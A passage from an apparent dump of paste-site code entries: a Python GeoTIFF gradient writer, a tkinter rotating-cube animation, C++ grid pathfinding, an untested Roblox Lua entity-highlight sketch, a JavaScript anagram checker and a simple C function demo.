    dim=-1
)

grad_img = rearrange(
    tensor=(
        torch.atan(
            torch.linalg.lstsq(
                A=dt,
                B=db,
                rcond=None,
                driver=None
            ).solution
        ) / (torch.pi / 2)
    ),
    pattern=""(h w) c 1 -> c h w""
).detach().cpu().numpy()

meta = rio.open(img_list[0], 'r').meta.copy()
meta[""count""], meta[""height""], meta[""width""] = grad_img.shape
meta[""driver""] = ""GTiff""
meta[""dtype""] = grad_img.dtype
meta[""predictor""] = 3
meta[""tiled""] = True
meta[""blockxsize""] = 64
meta[""blockysize""] = 64
meta[""compress""] = ""LZW""
meta[""num_threads""] = 4
meta[""sparse_ok""] = True
meta[""nodata""] = nodata

# 1st channel `m` and 2nd channel `c`
with rio.open(dst_img, 'w', **meta) as dst:
    dst.write(grad_img)"
kag3wUgv,# tk_Rotating_Cube_Illusion.py,here2share,Python,Tuesday 13th of February 2024 10:44:05 AM CDT,"# tk_Rotating_Cube_Illusion.py

ww, hh = 600, 600

from tkinter import *
import math
import random
import copy
from PIL import Image, ImageDraw, ImageTk, ImageChops

random.seed(0)

def update_cube_coordinates():
	for i in range(8):
		x, y, z = rotated_coords[i][:3]
		coordinates[i] = get_coords(x , y, z)

def get_coords(x, y, z):
	rxy = (x**2 + y**2)**(1/2)
	rxz = (x**2 + z**2)**(1/2)
	ryz = (y**2 + z**2)**(1/2)

	if x > 0 and y > 0:
		txy = math.atan(y/x)
	elif x > 0 and y < 0:
		txy = 2*math.pi + math.atan(y/x)
	elif x < 0 and y > 0:
		txy = math.pi + math.atan(y/x)
	elif x < 0 and y < 0:
		txy = math.pi + math.atan(y/x)

	if z > 0 and x > 0:
		txz = math.atan(x/z)
	elif z > 0 and x < 0:
		txz = 2*math.pi + math.atan(x/z)
	elif z < 0 and x > 0:
		txz = math.pi + math.atan(x/z)
	elif z < 0 and x < 0:
		txz = math.pi + math.atan(x/z)

	if y > 0 and z > 0:
		tyz = math.atan(z/y)
	elif y > 0 and z < 0:
		tyz = 2*math.pi + math.atan(z/y)
	elif y < 0 and z > 0:
		tyz = math.pi + math.atan(z/y)
	elif y < 0 and z < 0:
		tyz = math.pi + math.atan(z/y)

	return x, y, z, rxy, rxz, ryz, txy, txz, tyz

def rotate_z(coord, t):
	txy = coord[6] + t if coord[6] + t >= 0 else coord[6] + t + 2*math.pi
	x = math.cos(txy) * coord[3]
	y = math.sin(txy) * coord[3]
	return get_coords(x, y, coord[2])

def rotate_y(coord, t):	
	txz = coord[7] + t if coord[7] + t >= 0 else coord[7] + t + 2*math.pi
	z = math.cos(txz) * coord[4]
	x = math.sin(txz) * coord[4]
	return get_coords(x, coord[1], z)

def rotate_x(coord, t):	
	tyz = coord[8] + t if coord[8] + t >= 0 else coord[8] + t + 2*math.pi
	y = math.cos(tyz) * coord[5]
	z = math.sin(tyz) * coord[5]
	return get_coords(coord[0], y, z)

rotation_speeds = {}
def rotation():
	rotation_speeds[""X""] = random.uniform(0.02, 0.05) * random.choice((1, -1))
	rotation_speeds[""Y""] = random.uniform(0.02, 0.05) * random.choice((1, -1))
	rotation_speeds[""Z""] = random.uniform(0.02, 0.05) * random.choice((1, -1))
rotation()

def alias_line(x1, y1, x2, y2):
	num_squares = int(max(abs(x2 - x1), abs(y2 - y1))) or 1
	for i in range(0, num_squares + 1, sq):
		x = (x1 + i * (x2 - x1) // num_squares) // sq * sq
		y = (y1 + i * (y2 - y1) // num_squares) // sq * sq
		try:
			if img.getpixel((x + 2, y + 2)) != (0, 0, 0):
				pos, color = xy[x, y, 'b']
			else:
				pos, color = xy[x, y]
			draw.rectangle(pos, outline=None, fill=color)
		except:
			0
def plot():
	for i in range(4):
		alias_line(rotated_coords[i][0] * Vz/dd + Vx, rotated_coords[i][2] * Vz/dd + Vy,
				 rotated_coords[(i + 1) % 4][0] * Vz/dd + Vx, rotated_coords[(i + 1) % 4][2] * Vz/dd + Vy)

		alias_line(rotated_coords[i + 4][0] * Vz/dd + Vx, rotated_coords[i + 4][2] * Vz/dd + Vy,
				 rotated_coords[((i + 1) % 4) + 4][0] * Vz/dd + Vx, rotated_coords[((i + 1) % 4) + 4][2] * Vz/dd + Vy)

		alias_line(rotated_coords[i][0] * Vz/dd + Vx, rotated_coords[i][2] * Vz/dd + Vy,
				 rotated_coords[i + 4][0] * Vz/dd + Vx, rotated_coords[i + 4][2] * Vz/dd + Vy)

ww, hh = 640, 640
dd = 600
sz = 100
xSpeed = 5.7
ySpeed = 7.8
zSpeed = 9.9
Vx = ww/2
Vy = hh/2
Vz = 1000
bd = 10
sq = 5

coordinates = [
	get_coords(sz, sz, -sz), get_coords(-sz, sz, -sz), get_coords(-sz, sz, sz), get_coords(sz, sz, sz),
	get_coords(sz, -sz, -sz), get_coords(-sz, -sz, -sz), get_coords(-sz, -sz, sz), get_coords(sz, -sz, sz)
]

win = Tk()
win.title(""# tk_Rotating_Cube_Illusion"")
win.geometry(""%dx%d+%d+%d"" %(ww, hh, 10, 10))

C = Canvas(win, width=ww, height=hh)
C.pack()

img = Image.new(""RGB"", (ww, hh), ""white"")
draw = ImageDraw.Draw(img)

for x in range(-2, 3):
	for y in range(-2, 3):
		C.create_text(x + ww // 2, y + 50, text=""PRESS SPACEBAR"", fill=""white"", font=(""Arial"", 40, ""bold""), anchor=""center"", tag=""hideable_text"")
C.create_text(ww // 2, 50, text=""PRESS SPACEBAR"", fill=""red"", font=(""Arial"", 40, ""bold""), anchor=""center"", tag=""hideable_text"")
def blink_text():
	current_state = ""normal"" if C.itemcget(""hideable_text"", ""state"") == ""hidden"" else ""hidden""
	C.itemconfig(""hideable_text"", state=current_state)
	C.tag_raise(""hideable_text"")

	win.after(1000, blink_text)

xy = {}
for i in range(0, ww, sq):
	for j in range(0, hh, sq):
		pos = [i, j, i + sq - 1, j + sq - 1]
		xy[i, j] = (pos, ""white"")
		xy[i, j, 'b'] = (pos, ""black"")
		draw.rectangle(pos, outline=None, fill=random.choice(('black', 'white')))

sp = 0.01
rotate = {
	""q"": (""X"", sp),
	""w"": (""X"", -sp),
	""e"": (""Y"", sp),
	""a"": (""Y"", -sp),
	""s"": (""Z"", sp),
	""d"": (""Z"", -sp),
}

def key_rotate(axis, t):
	rotation_speeds[axis] = t

for k, (axis, t) in rotate.items():
	win.bind(f""<Key-{k}>"", lambda event, axis=axis, t=t: key_rotate(axis, t))
	
def toggle_pause(event):
	global is_paused
	is_paused = not is_paused

blink_text()
win.bind(""<space>"", toggle_pause)
is_paused = False

while True:
	if not is_paused:
		rotated_coords = []
		for i in range(8):
			rotated_coords.append(rotate_x(coordinates[i], rotation_speeds[""X""]))
			rotated_coords[i] = rotate_y(rotated_coords[i], rotation_speeds[""Y""])
			rotated_coords[i] = rotate_z(rotated_coords[i], rotation_speeds[""Z""])

		plot()
		update_cube_coordinates()
						
		imgtk = ImageTk.PhotoImage(img)
		C.create_image(0, 0, anchor=NW, image=imgtk)
		C.tag_raise(""hideable_text"")

		at_wall = 0
		if Vx < -bd:
			xSpeed = abs(xSpeed)
			at_wall = 1
		elif Vx > ww + bd:
			xSpeed = -abs(xSpeed)
			at_wall = 1
		if Vy < -bd:
			ySpeed = abs(ySpeed)
			at_wall = 1
		elif Vy > hh + bd:
			ySpeed = -abs(ySpeed)
			at_wall = 1
		if Vz < 800:
			zSpeed = abs(zSpeed)
			at_wall = 1
		elif Vz > 1800:
			zSpeed = -abs(zSpeed)
			at_wall = 1
			
		if at_wall:
			rotation()
		
		Vx += xSpeed
		Vy += ySpeed
		Vz += zSpeed
	
	win.update()
"
pgx3Lz01,Untitled,Josif_tepe,C++,Tuesday 13th of February 2024 10:34:19 AM CDT,"#include <iostream>
#include <queue>
#include <fstream>
//#include <bits/stdc++.h>
using namespace std;
const int maxn = 1005;
const int INF = 1e9;
const int di[] = {-1, 1, 0, 0};
const int dj[] = {0, 0, -1, 1};
int n, m;
char mat[maxn][maxn];
int dist[maxn][maxn];
void paralel_bfs() {
    queue<int> q;
    vector<vector<bool>> v(n, vector<bool>(m, false));
    
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            dist[i][j] = -1;
            if(mat[i][j] == 'G') {
                q.push(i);
                q.push(j);
                q.push(0);
                v[i][j] = true;
            }
        }
    }
    while(!q.empty()) {
        int ci = q.front(); q.pop();
        int cj = q.front(); q.pop();
        int cekor = q.front(); q.pop();
        
        if(mat[ci][cj] != 'G') {
            dist[ci][cj] = cekor;
        }
//        cout << ci << "" "" << cj << endl;
        for(int i = 0; i < 4; i++) {
            int ti = ci + di[i];
            int tj = cj + dj[i];
            if(ti >= 0 and ti < n and tj >= 0 and tj < m and dist[ti][tj] == -1 and mat[ti][tj] == '.' and !v[ti][tj]) {
                q.push(ti);
                q.push(tj);
                q.push(cekor + 1);
                v[ti][tj] = true;
            }
        }
    }
    
}
struct node {
    int ci, cj, d;
    node () {}
    node(int _ci, int _cj, int _d) {
        ci = _ci;
        cj = _cj;
        d = _d;
    }
    bool operator < (const node & tmp) const {
        return d < tmp.d;
    }
};
bool visited[maxn][maxn];
void dijkstra(int si, int sj, int ei, int ej) {
   
}
int main() {
    ios_base::sync_with_stdio(false);
//    ifstream cin(""in.txt"");
    cin >> n >> m;
    int si, sj, ei, ej;
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            cin >> mat[i][j];
            if(mat[i][j] == 'R') {
                si = i;
                sj = j;
            }
            if(mat[i][j] == 'Z') {
                ei = i;
                ej = j;
            }
        }
    }
    mat[ei][ej] = '.';
    mat[si][sj] = '.';
//    cout << ""DA"" << endl;
    paralel_bfs();
//    cout << ""DA"" << endl;
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            visited[i][j] = false;
        }
    }
    priority_queue<node> pq;
    pq.push(node(si, sj, dist[si][sj]));
    int min_value = INF;
    while(!pq.empty()) {
        node c = pq.top();
        pq.pop();
        min_value = min(min_value, c.d);
        if(ei == c.ci and ej == c.cj) {
            cout << min_value << endl;
            break;
        }
        
//        cout << c.ci << ""  "" << c.cj << endl;
        for(int i = 0; i < 4; i++) {
            int ti = c.ci + di[i];
            int tj = c.cj + dj[i];
            if(ti >= 0 and ti < n and tj >= 0 and tj < m and !visited[ti][tj] and mat[ti][tj] == '.') {
                pq.push(node(ti, tj, dist[ti][tj]));
                visited[ti][tj] = true;
            }
        }
    }
    return 0;
}
/*
 .R234....
 ..1.3.1..
 ..G121G1.
 ....221..
 G...122..
 ....G12..
 ...**.3..
 ...Z..4..
 
 **/
"
tiMupRvt,roblox revealing entities so I can't be lonely,imtie,Lua,Tuesday 13th of February 2024 10:13:55 AM CDT,"--- Once again my PC shut off at home so I can't test this... oh well at least I can type ideas down.
local Player = game.Players.LocalPlayer
local Char = Player.Character
---Services
local InputService = game:GetService(""UserInputService"")
---Deboucnes
local RevealDB = false
--Highlightstats
local HighlightDuration = 5    
local HighlightColor = Color3.New(0,0,0) -- basic white color    
    
local function RevealAllEntities()
    RevealDB = true
   local Highlights = {}
    for i, NewChar in pairs(game.WorkSpace:GetChildren()) do
    if NewChar:FindFirstChild(""Humanoid"") ~= nil and NewChar.Name ~= Char.Name then
        if NewChar.Humanoid.Health > 0 then  -- if statements to see if they should be detected
           local Highlight = Instance.new(""Highlight"",NewChar)
               Highlight.OutlineColor = HighlightColor
                    table.Insert(HighlightedChars, Highlight)   
               NewChar.Humanoid.Died:Connect(function() 
                    if Highlight.Parent ~= nil then Highlight:Destroy() end
                    end)
                
        end
    end
    
        task.wait(HighlightDuration)
        if #Highlights > 0 then
            for i, Highlight in Pairs(Highlights) do
              if Highlight.Parent ~= nil then Highlight:Destroy() end
                end
            end
        RevealDB = false
    end
    
    -- tbh I'd prefer making it a client event but here's a basic input use for it
    InputService.InputBegan:Connect(function(input, GameProcessed)
    if not GameProcessed then
       if input.Keycode == Enum.Keycode.F and RevealDB == false then
         RevealAllEntities()
       end
    end
end)
    "
zhp8Ez4r,anagram.js leetcode question,c-mcbride,JavaScript,Tuesday 13th of February 2024 10:10:19 AM CDT,"//Leetcode solution for is anagram question. Basically we are checking to see if both elements have the same number of letters in different orders
//Uses obj as hashmap
//Time complexity O(n)

function anagrams(str1, str2) {
  //Check to see if the strings are equal, if not quick return
  if(str1.length !== str2.length){
    return false;
  }

  //split the strings into chars
  let str1Chars = str1.split("""");
  let str2Chars = str2.split("""");
  let str1Obj = {};
  let str2Obj = {};

  //Add each letter to hashtable, if the letter is already there, increment the value
  for(let i = 0; i < str1Chars.length; i++){
    let currentLetter = str1Chars[i];
    if(str1Obj[currentLetter]){
      str1Obj[currentLetter]++;
    }
    else{
      str1Obj[currentLetter] = 1;
    }
  }

  for(let i = 0; i < str2Chars.length; i++){
    let currentLetter = str2Chars[i];
    if(str2Obj[currentLetter]){
      str2Obj[currentLetter]++;
    }
    else{
      str2Obj[currentLetter] = 1;
    }
  }

  //Compare the two hashes
  //First make sure they have the same number of keys
  const str1Keys = Object.keys(str1Obj);
  const str2Keys = Object.keys(str2Obj);

  if(str1Keys.length !== str2Keys.length){
    return false;
  }

  //Next make sure the values of the keys map
  for(let key of str1Keys){
    if(str1Obj[key] !== str2Obj[key]){
      return false;
    }
  }

  return true;
}
"
Y6bfm0Tm,Untitled,dllbridge,C,Tuesday 13th of February 2024 10:08:29 AM CDT,"



#include   <stdio.h>
#include  <locale.h>       

int    add(    int, int    );   
float _add(float a, float b);  

 
////////////////////////////////////////////////////
int main()                                        // 
{
	
    setlocale(LC_ALL, ""rus"");
			 	
			 	
    int n = add(10, 15);			 	
			 	
    printf(""n = %d\n"", n); 	
    
    float f = _add(1.23, 5.27);			 	
			 	
    printf(""f = %.2f\n"", f); 	    
  
}



/////////////////////////////////////////////////////
int add(int a, int b)                              // 
{
	
	a += b;
	
	
return a;	
}



/////////////////////////////////////////////////////
float _add(float a, float b)                         // 
{
	
	a += b;
	
	
return a;	
}


 
/*
#include   <stdio.h>
#include  <locale.h>     

int add(int a);   

 
////////////////////////////////////////////////////
int main()                                        // 
{
	
    setlocale(LC_ALL, ""rus"");
			 	
			 	
    //int n = add(2);			 	
			 	
    printf(""n = %d"", add(32)); 	
  
return 0;
}



/////////////////////////////////////////////////////
int add(int a)                                     // 
{
	
	a = a + 1;
	
	
return a;	
}


 
*/


"
